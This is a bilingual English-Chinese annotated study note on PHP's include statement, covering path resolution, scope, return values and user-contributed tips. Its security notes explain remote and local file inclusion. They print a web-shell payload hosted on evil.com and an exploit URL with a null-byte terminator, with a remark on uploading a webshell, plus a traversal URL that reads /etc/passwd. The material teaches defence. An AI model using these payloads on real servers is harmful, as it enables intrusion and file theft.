## include

(PHP 4, PHP 5, PHP 7, PHP 8)

The `include` expression includes and evaluates the specified file. 
`include` 表达式包含并运行指定文件。（也就是说被包含的文件里面如果有执行函数等操作是会执行的！这个使用时需要特别注意）
`include` 是一个特殊的语法结构，不是函数，其参数不需要括号（当然也可以写括号，不影响运行）
The documentation below also applies to require. 
以下文档也适用于 require。

Files are included based on the file path given or, if none is given, the include_path specified. If the file isn't found in the include_path, `include` will finally check in the calling script's own directory and the current working directory before failing. The `include` construct will emit an **`E_WARNING`** if it cannot find a file; this is different behavior from require, which will emit an **`E_ERROR`**.
被包含文件先按参数给出的路径寻找，如果没有给出目录（只有文件名）时则按照 include_path （在php.ini配置的）指定的目录寻找。如果在 include_path 下没找到该文件则 `include` 最后才在调用脚本文件所在的目录和当前工作目录下寻找。如果最后仍未找到文件则 `include` 结构会发出一条 **`E_WARNING`** 不会终止脚本运行 ；这一点和 require 不同，后者会发出一个 **`E_ERROR`** 会终止脚本运行 。

Note that both `include` and `require` raise additional **`E_WARNING`**s, if the file cannot be accessed, before raising the final **`E_WARNING`** or **`E_ERROR`**, respectively.
注意如果文件无法访问， `include` 和 `require` 在分别发出最后的 **`E_WARNING`** 或 **`E_ERROR`** 之前，都会发出额外一条 **`E_WARNING`**。
>include（包含）失败，会先报： Warning：Failed to open stream。 再报： Warning:Failed opening ,但不会终止脚本，会继续执行后面的脚本。
>require(请求)失败，先报：Warning ，然后再报：Fatal error ，最后终止脚本

If a path is defined — whether absolute (starting with a drive letter or `\` on Windows, or `/` on Unix/Linux systems) or relative to the current directory (starting with `.` or `..`) — the include_path will be ignored altogether. For example, if a filename begins with `../`, the parser will look in the parent directory to find the requested file.
如果定义了路径——不管是绝对路径（在 Windows 下以盘符或者 `\` 开头，在 Unix/Linux 下以 `/` 开头）还是当前目录的相对路径（以 `.` 或者 `..` 开头）——include_path（在php.ini配置的） 都会被完全忽略。例如一个文件以 `../` 开头，则解析器会在当前目录的父目录下寻找该文件。
>因为此时用户已经给出了明确的路径,如果php还去include_path中'智能'地寻找文件,反而有可能不是用户预期的结果,所以两者取其一,如果你想'智能'就不要明确路径,如果你明确了路径,那么就不'智能' .

For more information on how PHP handles including files and the include path, see the documentation for include_path.
有关 PHP 怎样处理包含文件和包含路径的更多信息参见 include_path 部分的文档。

When a file is included, the code it contains inherits the variable scope of the line on which the include occurs. Any variables available at that line in the calling file will be available within the called file, from that point forward. However, all functions and classes defined in the included file have the global scope.
当一个文件被包含时，其中所包含的代码继承了 include 所在行的变量范围（作用域）。从该处开始，调用文件在该行处可用的任何变量在被调用的文件中也都可用。不过所有在包含文件中定义的函数和类都具有全局作用域。

----------
**Example #1 Basic `include` example**
最基础的‘包含’示例

    vars.php  
    <?php  
      
    $color = 'green';  
    $fruit = 'apple';  
      
    ?>  
      
    test.php  
    <?php  
      
    echo "A $color  $fruit"; // A  Warning: Undefined variable
      
    include 'vars.php';  
      
    echo "A $color  $fruit"; // A green apple  
      
    ?>
在未被包含进来前，调用vars.php里面的变量会报错：Undefined variable，在test.php把vars.php包含进来后，在test.php中就可以直接使用vars.php的变量了。（require也是这样）

----------
If the include occurs inside a function within the calling file, then all of the code contained in the called file will behave as though it had been defined inside that function. So, it will follow the variable scope of that function. An exception to this rule are magic constants which are evaluated by the parser before the include occurs.
如果 include 出现于调用文件中的一个函数里，则被调用的文件中所包含的所有代码将表现得如同它们是在该函数内部定义的一样。所以它将遵循该函数的变量范围。此规则的一个例外是[魔术常量]它们是在发生包含之前就已被解析器处理的。

**Example #2 Including within functions**
 在函数中使用include
 
    <?php  
    function foo()  
    {  
	    global $color;  
	      
	    include 'vars.php';  
	      
	    echo "A $color  $fruit";  
    }  
      
    /* vars.php is in the scope of foo() so *  
    * $fruit is NOT available outside of this *  
    * scope. $color is because we declared it *  
    * as global. */  
    //  vars.php处于foo()函数的作用域内，$fruit在函数外是不可用的，但$color可以用是因为我们把它声明为全局变量
    foo(); // A green apple  
    echo "A $color  $fruit"; // 报错   Undefined variable $fruit
      
    ?>

----------
When a file is included, parsing drops out of PHP mode and into HTML mode at the beginning of the target file, and resumes again at the end. For this reason, any code inside the target file which should be executed as PHP code must be enclosed within valid PHP start and end tags.
当一个文件被包含时，语法解析器在目标文件的开头脱离 PHP 模式并进入 HTML 模式，到文件结尾处恢复。由于此原因，目标文件中需要作为 PHP 代码执行的任何代码都必须被包括在[有效的 PHP 起始和结束标记]之中。


If "URL include wrappers" are enabled in PHP, you can specify the file to be included using a URL (via HTTP or other supported wrapper - see Supported Protocols and Wrappers for a list of protocols) instead of a local pathname. If the target server interprets the target file as PHP code, variables may be passed to the included file using a URL request string as used with HTTP GET. This is not strictly speaking the same thing as including the file and having it inherit the parent file's variable scope; the script is actually being run on the remote server and the result is then being included into the local script.
如果“[URL include wrappers]”（在php.ini中配置）在 PHP 中被激活，可以用 URL（通过 HTTP 或者ftp或其它支持的封装协议——见[支持的协议和封装协议]）而不是本地文件来指定要被包含的文件。如果目标服务器将目标文件作为 PHP 代码解释，则可以用适用于 HTTP GET 的 URL 请求字符串来向被包括的文件传递变量。严格的说这和包含一个文件并继承父文件的变量作用域并不是一回事；该脚本文件实际上已经在远程服务器上运行了，而本地脚本则包括了其结果。

>以后探究??远程服务器会执行一些脚本，并且变量会返回给本地服务器，然后本地服务器继续执行？整个过程是怎样的？

**Example #3 `include` through HTTP**
通过http进行远程包含

    <?php  
      
    /* This example assumes that www.example.com is configured to parse .php  
    * files and not .txt files. Also, 'Works' here means that the variables  
    * $foo and $bar are available within the included file. */  
    /* 这个示例假定 www.example.com 配置为解析 .php 文件而不解析 .txt 文件。 *  
	* 此外 “Works” 意味着 $foo 和 $bar 变量在包含的文件中是可用的。 */
      
    // Won't work; file.txt wasn't handled by www.example.com as PHP  
    include 'http://www.example.com/file.txt?foo=1&bar=2';  
      
    // Won't work; looks for a file named 'file.php?foo=1&bar=2' on the  
    // local filesystem.  
    include 'file.php?foo=1&bar=2';  
      
    // Works.  
    include 'http://www.example.com/file.php?foo=1&bar=2';  
    ?>


**Warning**

### Security warning 安全警告

Remote file may be processed at the remote server (depending on the file extension and the fact if the remote server runs PHP or not) but it still has to produce a valid PHP script because it will be processed at the local server. If the file from the remote server should be processed there and outputted only, readfile() is much better function to use. Otherwise, special care should be taken to secure the remote script to produce a valid and desired code.
远程文件可能会经远程服务器处理（根据文件后缀以及远程服务器是否在运行 PHP 而定），但必须产生出一个合法的 PHP 脚本，因为其将被本地服务器处理。如果来自远程服务器的文件应该在远端运行而只输出结果，那用 [readfile()] 函数更好。另外还要格外小心以确保远程的脚本产生出合法并且是所需的代码。

See also Remote files, fopen() and file() for related information.
相关信息参见[使用远程文件]，[fopen()]和 [file()]。

Handling Returns: `include` returns `FALSE` on failure and raises a warning. Successful includes, unless overridden by the included file, return `1`. It is possible to execute a return statement inside an included file in order to terminate processing in that file and return to the script which called it. 
处理返回值：在失败时 `include` 返回 `FALSE` 并且发出警告Warning。成功的包含则返回 `1`，除非在包含文件中另外给出了返回值。可以在被包括的文件中使用 [return]语句来终止该文件中后续的程序的执行并返回这个值给调用它的脚本。

Also, it's possible to return values from included files. You can take the value of the include call as you would for a normal function. This is not, however, possible when including remote files unless the output of the remote file has valid PHP start and end tags (as with any local file). You can declare the needed variables within those tags and they will be introduced at whichever point the file was included.
同样也可以从被包含的文件中返回值。可以像普通函数一样获得 include 调用的返回值。不过这在包含远程文件时却不行，除非远程文件的输出具有[合法的 PHP 开始和结束标记]（如同任何本地文件一样）。可以在标记内定义所需的变量，该变量在文件被包含的位置之后就可用了。

----------
Because `include` is a special language construct, parentheses are not needed around its argument. Take care when comparing return value.
因为 `include` 是一个特殊的语言结构，其参数不需要括号。在比较其返回值时要注意。

**Example #4 Comparing return value of include**
include的返回值用于比较时

    <?php  
    // won't work, evaluated as include(('vars.php') == TRUE), i.e. include('1') 
    // 不能运行，执行 include(('vars.php') == TRUE) 就等于执行 include('1') ，因为('vars.php') == TRUE 就是int(1)
    
    //下面两个例子的括号并没有改变代码的执行顺序
    //可以成功执行
    if (include('vars.php') == TRUE) {  
	    echo 'OK';  
    }  
    
    // works  
    //可以成功执行  
    if ((include 'vars.php') == TRUE) {  
	    echo 'OK';  
    }  
    ?>

---------

**Example #5 `include` and the return statement**
include带有return的文件

    return.php  
    <?php  
      
    $var = 'PHP1';  
      
    return $var;  
    
    $var3 = 'PHP3';
    
	function  getVar(){
		return  'function:getVar';
	}
	
	class  inVar{
		public  $name = 'inVar';
	}
	
    ?>  
      
    noreturn.php  
    <?php  
      
    $var = 'PHP2';  
      
    ?>  
      
    testreturns.php  
    <?php  
      
    $foo = include 'return.php';  
      
    echo $foo; // prints 'PHP1'  //获取了return.php里面$var的值
      
    $bar = include 'noreturn.php';  
      
    echo $bar; // prints 1   //noreturn.php里面没有return,include成功后结果就是int(1)
    
    var_dump( $var);  // prints 'PHP2'  //noreturn.php后面才加入,覆盖掉了先加入的return.php里面的同名变量
    //但是如果两个变量不同名,叫var1和var2的话,那么
	 var_dump( $var1); //string(4) "PHP1" //虽然有return,但在testreturns.php中是存在var1的
	 var_dump( $var2); //string(4) "PHP2"
	//我们来看看return之后的代码php是如何处理的
	var_dump( $var3); //Undefined variable $var3 ,在return之后再定义的变量不可用,因为return之后的脚本不会被执行
    var_dump(getVar());//string(15) "function:getVar" ,但在return之后的定义的函数和类是可以调用的
	var_dump( new  inVar());  
	//打印:					object(inVar)#1 (1) {
							  ["name"]=>
							  string(5) "inVar"
							}
    $foo = include 'return.php';  //再次包含一次相同的文件:PHP Fatal error:  Cannot redeclare,发生致命错误:重复声明XXX
    var_dump( include 'return2.php'); //包含失败时,先发出警告:Warning: include(): Failed opening 'return2.php' ,然后继续执行,最终返回结果:bool(false)
    ?>

`$bar` is the value `1` because the include was successful. Notice the difference between the above examples. The first uses return within the included file while the other does not. If the file can't be included, **`false`** is returned and **`E_WARNING`** is issued.
`$bar` 的值为 `1` 是因为 include 成功运行了。注意以上例子中的区别。第一个在被包含的文件中用了 [return]而另一个没有。如果文件不能被包含，则返回 **`false`** 并发出一个 **`E_WARNING`** 警告。

If there are functions defined in the included file, they can be used in the main file independent if they are before return or after. If the file is included twice, PHP will raise a fatal error because the functions were already declared. It is recommended to use include_once instead of checking if the file was already included and conditionally return inside the included file.
如果在包含文件中定义了函数(或类)，无论是在 [return] 之前还是之后，都可以独立在主文件（main）中使用。如果文件被包含两次，由于函数(或类)重复定义，PHP 会 发出致命错误（fatal error:Cannot redeclare）。推荐使用 [include_once] 而不是检查文件是否已包含并在包含文件中有条件返回。

----------

Another way to "include" a PHP file into a variable is to capture the output by using the Output Control Functions with `include`. For example:
另一个将 PHP 文件“包含”到一个变量中的方法是用[输出控制函数]结合 **include** 来捕获其输出，例如：

**Example #6 Using output buffering to include a PHP file into a string**
使用输出缓冲来将PHP文件包含入一个字符串中
	英文文档的代码
	
    <?php  
    $string = get_include_contents('somefile.php');  
      
    function get_include_contents($filename) {  
	    if (is_file($filename)) {  
		    ob_start();  
		    include $filename;  
		    return ob_get_clean();  //得到当前缓冲区的内容并删除当前输出缓冲区 
		    //ob_get_clean()实质上是一起执行了 [ob_get_contents()] 和 [ob_end_clean()]。
	    }  
	    return false;  
	}  
      
    ?>

 中文文档的代码

	   <?php  
	    $string = get_include_contents('somefile.php');  
	      
	    function get_include_contents($filename) {  
		    if (is_file($filename)) {  
			    ob_start();  
			    include $filename;  
			    $contents = ob_get_contents();  
			    ob_end_clean();  
			    return $contents;  
		    }  
		    return false;  
	    }  
      
    ?>
结果会把somefile.php里面需要打印(输出缓冲区)的内容,全部保存到$contents中.

--------

In order to automatically include files within scripts, see also the auto_prepend_file and auto_append_file configuration options in php.ini.
要在脚本中自动包含文件，参见 php.ini 中的 [auto_prepend_file]和 [auto_append_file] 配置选项。

> **Note**: Because this is a language construct and not a function, it cannot be called using variable functions, or named arguments.
> **注意**: 因为是语言构造器而不是函数，不能被  [可变函数] 或者  [命名参数] 调用。

See also require, require_once, include_once, get_included_files(), readfile(), virtual(), and include_path.
其他资料可以参见require, require_once, include_once, get_included_files(), readfile(), virtual(), and include_path。

----------
### User Contributed Notes  用户贡献的笔记
笔记1

**snowyurik at gmail dot com** 05-Nov-2008 10:49

This might be useful:  
这很有用:
    <?php  
	    include $_SERVER['DOCUMENT_ROOT']."/lib/sample.lib.php";  
    ?>  
DOCUMENT_ROOT是指根目录的路径,这样得到的就是绝对路径.
So you can move script anywhere in web-project tree without changes.
这样你就可以把web项目移动到任何地方,而不需要改代码.

----------
笔记2

**Rash** 17-Jan-2015 05:55

If you want to have include files, but do not want them to be accessible directly from the client side, please, please, for the love of keyboard, do not do this:  
  如果你想包含文件,却不想客户端能够直接访问到这些文件,请不要像下面这样做:
<?php  
  
 index.php  
define('what', 'ever');  
include 'includeFile.php';  
  
 includeFile.php  
  
// check if what is defined and die if not  
  
?>  
  
The reason you should not do this is because there is a better option available. Move the includeFile(s) out of the document root of your project. So if the document root of your project is at "/usr/share/nginx/html", keep the include files in "/usr/share/nginx/src".  
  这里有更好的选择.把'包含'目录移到项目根目录外面.
  
<?php  
  
 index.php (in document root (/usr/share/nginx/html))  
  
include __DIR__ . '/../src/includeFile.php';  
  
?>  
  
Since user can't type 'your.site/../src/includeFile.php', your includeFile(s) would not be accessible to the user directly.
因为用户不能定位到'your.site/../src/includeFile.php'(超出了Nginx对于当前网站的限定范围),你的'包含'目录不会被用户直接访问到.

----------
笔记3
这个用户笔记讲述了一个简单的由于include而引起的安全漏洞

**John Carty** 20-Oct-2016 08:29

Before using php's include, require, include_once or require_once statements, you should learn more about Local File Inclusion (also known as LFI) and Remote File Inclusion (also known as RFI).  
在使用  include, require, include_once or require_once语句前,你应该学习更多的关于本地文件包含和远程文件包含的知识.
  
As example #3 points out, it is possible to include a php file from a remote server.  
 例如例子3指出的,php可以包含一个远程的Php文件
  
The LFI and RFI vulnerabilities occur when you use an input variable in the include statement without proper input validation. Suppose you have an example.php with code:  
LFI和RFI的弱点存在于当你在一个include语句中使用一个未经验证的用户输入变量, 
假如有一个这样的例子:
  

    <?php  
    // Bad Code  坏代码
	    $path = $_GET['path'];  
	    include $path . 'example-config-file.php';  //直接使用了用户提交过来的内容在include语句中
    ?>  
    
As a programmer, you might expect the user to browse to the path that you specify.  
作为一个程序员,你希望用户输入的路径是你所期待的.
  
However, it opens up an RFI vulnerability. To exploit it as an attacker, I would first setup an evil text file with php code on my evil.com domain.  
然而,这打开了一个RFI漏洞,被攻击者利用.  我会首先在我的网站上面创建一个邪恶的text文件
evil.txt  

    <?php echo shell_exec($_GET['command']);?>  //这个是让php执行命令

  
It is a text file so it would not be processed on my server but on the target/victim server. I would browse to:  
h t t p : / / w w w .example.com/example.php?command=whoami& path= h t t p : / / w w w .evil.com/evil.txt%00  
这是个text文件因此不会在我的服务器上面运行,却会在目标/受害者服务器上运行.我会浏览:
h t t p : / / w w w .example.com/example.php?command=whoami& path= h t t p : / / w w w .evil.com/evil.txt%00  
  
The example.php would download my evil.txt and process the operating system command that I passed in as the command variable. In this case, it is whoami. I ended the path variable with a %00, which is the null character. The original include statement in the example.php would ignore the rest of the line. It should tell me who the web server is running as.  
目标网站的php会下载我的 邪恶.txt然后执行我通过变量传递的操作系统命令,  在这个例子中是:whoami.我把%00作为路径变量的结尾,代表是一个空字符.在原本的include语句中会忽略剩余的内容.这样就会告诉我当前web服务器是谁(用户名)在运行.
  
Please use proper input validation if you use variables in an include statement.
请使用合适的验证如果你在include语句中使用变量

在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示[字符串]结束，所以当url中出现%00时就会认为读取已结束

比如

`https://mp.csdn.net/upfiles/?filename=test.txt`  此时输出的是test.txt

加上%00

`https://mp.csdn.net/upfiles/?filename=test.php%00.txt`  此时输出的是test.php

就绕过了后缀限制，可以上传webshell啦。因为php会忽略%00后面的内容,而会只保留test.php.这样就把一个php文件上传到服务器了,这样就可以进行访问执行了.


----------
笔记4

**Anon** 26-Feb-2012 06:31

I cannot emphasize enough knowing the active working directory. Find it by: echo getcwd();  
Remember that if file A includes file B, and B includes file C; the include path in B should take into account that A, not B, is the active working directory.

我对于活动工作目录(也就是当前工作目录)的理解再怎么强调也不为过. 找(当前工作目录)的办法: getcwd() :Gets the current working directory,作用是取得当前工作目录;
请记住，如果文件A包括文件B，而B包括文件C；那么B的包含路径里面的当前工作目录(也就是那个点.所代表的目录)应该是A的目录,而不仅仅是B的目录.

这个用户没有给出代码例子,我这里写一个示例:
在user_note4目录中创建
a.php

    <?php
    
    //研究include_path中的加载文件的目录的先后顺序
    //A包含B,B包含C, 那么A和B的 include_path有何不同,PHP到底采用哪个?还是说合并采用?
    
    include  'examples1/b.php';
    var_dump($c);

在user_note4/examples1目录中创建
b.php

    <?php
    include  'c.php';

在user_note4 目录中创建
c.php

    <?php
    $c = 'c1';

在user_note4/examples1 目录中创建
c.php

    <?php
    $c = 'c2';

此时,我们执行a.php,得到的结果是:  string(2) "c1" ,表示加载的c.php是与a.php同级的那个.
然后把这个同级的c.php改名叫c_old.php , 此时再得到的结果是:  string(2) "c2" ,这表明,此时加载的c.php是与b.php同级的那个.
那么我们可以得知, 在寻找文件时,以首先调用的那个文件所在目录(当前工作目录)为优先寻找指定名称的文件.如果找不到,再去到执行include语句所在目录(脚本执行目录)寻找.
但是要注意,无论经过多少层include,比如a ->b->c->d->e ,php也只会在a所在目录和 d所在目录寻找e.php,不会在中间的b,c的目录寻找e.php文件. 被搜寻的目录只有2个, 不是每层目录都搜索.
即使在d,c目录中有e.php,也会报错:No such file or directory

----------

笔记5

**error17191 at gmail dot com** 01-Oct-2015 09:39

When including a file using its name directly without specifying we are talking about the current working directory, i.e. saying (include "file") instead of ( include "./file") . PHP will search first in the current working directory (given by getcwd() ) , then next searches for it in the directory of the script being executed (given by __dir__).  
当进行包含文件时,直接使用文件名,而没有具体说明,那我们默认是在当前工作目录.也就是用(include "file") 代替( include "./file") (这两种写法有可能指向的是同一个文件,但从写法上来看,前一种写法是没有指明文件在哪里,而后一种写法明确指明了文件在当前目录). PHP会首先在当前工作目录寻找文件(getcwd()方法给出的),然后再去脚本(include语句)执行的目录寻找(__dir__给出的).


This is an example to demonstrate the situation :  
这是一个例子用来说明这个情况:
We have two directory structure :   我们有2个目录结构
-dir1  目录1
----script.php  
----test  
----dir1_test  
-dir2  目录2
----test  
----dir2_test  
  
dir1/test contains the following text :  
This is test in dir1  
dir2/test contains the following text:  
This is test in dir2  
dir1_test contains the following text:  
This is dir1_test  
dir2_test contains the following text:  
This is dir2_test  
  
script.php contains the following code:  

    <?php  
      
    echo 'Directory of the current calling script: ' . __DIR__;  
    echo '<br />';  
    echo 'Current working directory: ' . getcwd();  
    echo '<br />';  
    echo 'including "test" ...';  
    echo '<br />';  
    include 'test';  
    echo '<br />';  
    echo 'Changing current working directory to dir2';  
    chdir('../dir2');  
    echo '<br />';  
    echo 'Directory of the current calling script: ' . __DIR__;  
    echo '<br />';  
    echo 'Current working directory: ' . getcwd();  
    echo '<br />';  
    echo 'including "test" ...';  
    echo '<br />';  
    include 'test';  
    echo '<br />';  
    echo 'including "dir2_test" ...';  
    echo '<br />';  
    include 'dir2_test';  
    echo '<br />';  
    echo 'including "dir1_test" ...';  
    echo '<br />';  
    include 'dir1_test';  
    echo '<br />';  
    echo 'including "./dir1_test" ...';  
    echo '<br />';  
    (@include './dir1_test') or die('couldn\'t include this file ');  
    ?>  

The output of executing script.php is :  输出的结果是:
  
Directory of the current calling script: C:\dev\www\php_experiments\working_directory\example2\dir1  
Current working directory: C:\dev\www\php_experiments\working_directory\example2\dir1  
including "test" ...  
This is test in dir1   //输出了dir1 里面那个test的内容,因为在当前工作目录中存在test文件
Changing current working directory to dir2  
Directory of the current calling script: C:\dev\www\php_experiments\working_directory\example2\dir1  
Current working directory: C:\dev\www\php_experiments\working_directory\example2\dir2  
including "test" ...  
This is test in dir2  //输出了dir2 里面那个test的内容,因为在当前工作目录(修改后的)中存在test文件,php会优先包含当前工作目录中的文件,如果找不到才会去脚本执行目录寻找
including "dir2_test" ...  
This is dir2_test   //在当前工作目录找到了dir2_test
including "dir1_test" ...  
This is dir1_test  //在当前工作目录找不到了dir1_test,但在脚本执行目录找到了dir1_test
including "./dir1_test" ...  
couldn't include this file //在当前工作目录下找不到dir1_test,因为当你使用绝对或相对路径,指明了文件所在,那么php就会完全忽略include_path.而只会在你指定的目录中寻找文件.在这个例子中,当前工作目录被变成了dir2,而dir2里面是没有 dir1_test这个文件的.

这个例子进一步证明了笔记4中说明的内容:被搜索的目录有2个,然后有优先级之分.
我们要分清楚两种目录:1当前工作目录,会优先在这里搜索,getcwd()方法获得. 2脚本执行目录,__dir__获得. 
当前工作目录默认就是你调用的第一个Php文件的目录(用点' . '表示),这个工作目录可以后续通过chdir()方法修改.脚本执行目录则是指运行的那行代码所在的目录,这个无法修改.

----------
笔记6

**Wade.** 22-Oct-2008 08:20

If you're doing a lot of dynamic/computed includes (>100, say), then you may well want to know this performance comparison: if the target file doesn't exist, then an @include() is *ten* *times* *slower* than prefixing it with a file_exists() check. (This will be important if the file will only occasionally exist - e.g. a dev environment has it, but a prod one doesn't.)
如果你正在做很多动态计算的包含操作(大于100个),那么你应该了解这个性能比较:
如果目标文件不存在,那么@include()是10倍慢于在它前面使用file_exists()进行检查.(include文件不存在时会发出警告,前面用@表示屏蔽警告)
这对于那些偶尔存在的文件很重要,例如在开发环境中存在,而在生产环境中不存在.
因为file_exists()是你给出明确的文件路径,然后去查找,而include()在你没有明确指出路径时,它会在include_path里面搜索,这直接就可以看出来include干的事情更多,更慢.

----------
笔记7

**Rick Garcia** 08-May-2008 09:38

As a rule of thumb, never include files using relative paths. To do this efficiently, you can define constants as follows:  
作为实用的经验总结: 永远不用在包含文件时使用相对路径.你可以定义常量来有效地实现功能:

    <?php // prepend.php - autoprepended at the top of your tree  前置.php,在文件树最顶级目录中自动预置
    define('MAINDIR',dirname(__FILE__) . '/');  //__FILE__:得到代码所在文件的完整路径和文件名。dirname():返回路径中的目录部分 .所以也就是得到这个顶层文件所在的目录.
    define('DL_DIR',MAINDIR . 'downloads/');  //得到次级目录downloads的路径
    define('LIB_DIR',MAINDIR . 'lib/');   //得到次级目录lib的路径
    ?>  

and so on. This way, the files in your framework will only have to issue statements such as this:  
 以此类推,按照这种方式,在你的框架里的所有文件只需要使用下面这样的语句:

    <?php  
	    require_once(LIB_DIR . 'excel_functions.php');  
    ?>  

  
This also frees you from having to check the include path each time you do an include.  
  这样你就从每次都要检查包含路径的工作中解放出来了.
If you're running scripts from below your main web directory, put a prepend.php file in each subdirectory:  
  如果你运行的脚本在你的主网站目录下面,你就在每一个子目录中引入prepend.php:

    <?php  
	    include(dirname(dirname(__FILE__)) . '/prepend.php');  //连续两个dirname,就可以获得上一层的目录路径了
    ?> 
    
This way, the prepend.php at the top always gets executed and you'll have no path handling headaches. Just remember to set the auto_prepend_file directive on your .htaccess files for each subdirectory where you have web-accessible scripts.
通过这种方式,prepend.php在顶层目录,总是可以得到执行,然后你就无需为了处理路径问题而头痛了.请记得在你的每一个有web-accessible(网络可访问性)要求的脚本的子目录中都创建一个.htaccess文件并在其中配置auto_prepend_file指令.
(关于auto_prepend_file和在.htaccess中配置,请自行查找资料!)

>我们在使用各种框架时,一般都是一个入口文件,然后获取这个入口文件的路径,然后其他各类配套的目录(框架已经定义好功能作用的目录)的路径就是相对这个路径而获得的.这样无论你把项目放到哪里,在项目内部这些目录的相对关系没有改变,框架就能正确运行.

----------
笔记7

**jbezorg at gmail dot com** 26-Apr-2018 02:34

Ideally includes should be kept outside of the web root. That's not often possible though especially when distributing packaged applications where you don't know the server environment your application will be running in. In those cases I use the following as the first line.  
在理想情况下,包含目录应该在网站根目录之外(这样更安全),但这通常是不可能的,因为一些分发打包的程序,你不知道服务器的运行环境.在这种情况下,我(在被include的文件中)使用下面的语句在文件首行.

    ( __FILE__ != $_SERVER['SCRIPT_FILENAME'] ) or exit ( 'No' );

    __FILE__:表示当前代码所在的文件的绝对路径

    SCRIPT_FILENAME:表示执行入口文件的绝对路径(如果是在命令行执行,则是显示你执行时输入的路径,通常我们输入的是相对路径)
    比如A.php 在a目录,B.php在b目录, 然后A.php包含B.php,然后执行A.php,那么在B.php文件中__FILE__是b/B.php, SCRIPT_FILENAME还是a/A.php .
    因为脚本运行的入口是A.php .

这行代码的意思是:如果当前执行的代码文件 与  程序的执行入口文件 是同一个文件, 就结束程序.
这个用户这样设置的话,就可以不允许直接执行被包含文件,一旦你直接执行这些用于被包含的文件,就会exit退出.
这样做的话,就会更安全一些.因为如果有用户访问到了这些本来不应该被直接访问的文件,程序会自动结束.

----------
笔记8

**Ray.Paseur often uses Gmail** 30-Sep-2014 11:05

It's worth noting that PHP provides an OS-context aware constant called DIRECTORY_SEPARATOR. If you use that instead of slashes in your directory paths your scripts will be correct whether you use *NIX or (shudder) Windows. (In a semi-related way, there is a smart end-of-line character, PHP_EOL)  
值得注意的是PHP提供了一个系统上下文自适应的常量,叫DIRECTORY_SEPARATOR(目录分隔符常量).如果你在你的目录路径中使用这个代替斜杠,这样你的脚本会正常运行,无论是在类unix系统或者(颤栗,害怕)Windows系统.(这有点类似,end-of-line字符,PHP_EOL换行符常量: unix系列用 \n, windows系列用 \r\n,mac用 \r)
  
Example:  

    <?php  
    $cfg_path   = 'includes'   . DIRECTORY_SEPARATOR   . 'config.php'  ;  
    require_once($cfg_path);

>我们在使用各类框架时,都会发现这些框架在定义路径相关的变量时,全部都是使用DIRECTORY_SEPARATOR,而不会写死用斜杠或者反斜杠,不然这样就无法在多种平台运行了.

----------
笔记9

**Chris Bell** 12-Nov-2009 05:12

A word of warning about lazy HTTP includes - they can break your server.  
  警告一下,关于惰性HTTP 包含-这可能会爆破你的服务器.
  
If you are including a file from your own site, do not use a URL however easy or tempting that may be. If all of your PHP processes are tied up with the pages making the request, there are no processes available to serve the include. The original requests will sit there tying up all your resources and eventually time out.  
如果你从你自己的网站进行包含文件,不要使用URL方式,虽然这样可能会很简单或者吸引人.如果你的PHP进程由于请求而忙得不可开交,就没有进程去服务于include.原始请求会停在那里,然后捆住(占用)你的全部资源,最终超时.
  
Use file references wherever possible. This caused us a considerable amount of grief (Zend/IIS) before I tracked the problem down.
应该尽可能的使用文件引用.这(使用http方式)给我们带来了相当多的烦恼在我追踪到问题所在之前.

>我暂时还没遇到过使用http方式进行文件包含的项目,因为一般项目不需要这样做.除非是大型项目,有多个分布式的服务器,但无论怎样,用http方式进行文件加载包含,都是不安全 和慢的.可能这些项目是想更简单一点?但这样得不偿失.这可能是一种类似微服务的实现.通过include,直接进行http请求,然后让其他服务器进行运行,最终返回一个结果.

-----------
笔记10

**sPlayer** 02-Mar-2011 09:09

Sometimes it will be usefull to include a string as a filename  
有时候,把一个字符串作为文件名进行包含也很有用
	< ?php  
      
	    //get content  
	    $cFile = file_get_contents('crypted.file');  
	    //decrypt the content  
	    $content = decrypte($cFile);  
	      
	    //include this  
	    include("data://text/plain;base64,".base64_encode($content));  
	    //or  
	    include("data://text/plain,".urlencode($content));  
    ?>

这个例子具体的情况用户也没有说明,crypted.file里面的内容是什么没有具体说明,但必须是一个合法的 PHP 脚本.
这样做的好处是什么呢?从这个例子代码中,应该是crypted.file的内容是经过加密的,读取之后进行了解密,得到的是一串字符串(应该是很长很长的),然后再用include进行包含,把这串字符串转化为PHP代码,这样就可以运行加密的代码了.

-----------
笔记11


**joe dot naylor at gmail dot com** 22-Oct-2010 02:11

Be very careful with including files based on user inputed data. For instance, consider this code sample:  
 请非常注意,如果使用用户输入的数据作为包含文件的基础,作为实例,请看下面这个例子 :
 
index.php:  

    <?php  
    $page = $_GET['page'];  
    if (file_exists('pages/'.$page.'.php'))  
    {  
	    include('pages/'.$page.'.php');  
    }  
    ?>  

  
Then go to URL:  
index.php?page=/../../../../../../etc/passwd%00.html  
  
file_exists() will return true, your passwd file will be included and since it's not php code it will be output directly to the browser.  
file_exists()会返回真,你的密码文件会被包含进来,然后因为它不是Php代码,所以它会被直接输出到浏览器.
  
Of course the same vulnerability exists if you are reading a file to display, as in a templating engine.  
 当然相同的漏洞存在于如果你读取一个文件来显示,例如模板引擎, 
  
You absolutely have to sanitize any input string that will be used to access the filesystem, you can't count on an absolute path or appended file extension to secure it. Better yet, know exactly what options you can accept and accept only those options.
你绝对必须清除(过滤)将用于访问文件系统的任何输入字符串，你不能指望绝对路径或附加的文件扩展名来保护它。更好的是，确切地知道你可以接受什么选项，并且只接受这些选项。

>在实际项目中,几乎不会遇到由用户的输入来决定加载什么文件的.如果真的需要,也只能是给用户选择选项来决定加载哪个文件.绝对不能让用户进行输入任何有关文件的名称和路径.这个笔记也是讲述了关于include的安全性问题.

-----------
笔记11

**hyponiq at gmail dot com** 02-Nov-2009 02:12

I would like to point out the difference in behavior in IIS/Windows and Apache/Unix (not sure about any others, but I would think that any server under Windows will be have the same as IIS/Windows and any server under Unix will behave the same as Apache/Unix) when it comes to path specified for included files.  
  
Consider the following:  
<?php  
include '/Path/To/File.php';  
?>  
  
In IIS/Windows, the file is looked for at the root of the virtual host (we'll say C:\Server\Sites\MySite) since the path began with a forward slash. This behavior works in HTML under all platforms because browsers interpret the / as the root of the server.  
在  IIS/Windows上面,会在这个虚拟主机的根目录(例如:C:\Server\Sites\MySite)里面寻找这个文件,因为这个路径是以正斜杠(/)开头的.这个行为在所有平台都可行,因为浏览器会解析' / '为web服务器(虚拟主机)的根目录(在url).

